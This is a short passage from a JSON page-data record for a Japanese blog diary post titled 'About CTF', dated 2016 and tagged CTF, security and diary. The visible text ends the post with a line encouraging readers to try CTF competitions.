以上\n\nCTFやろう\n","title":"CTFのはなし","image":null,"tags":["CTF","セキュリティ","日記"],"date":"2016-06-08T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"}]},"__N_SSG":true}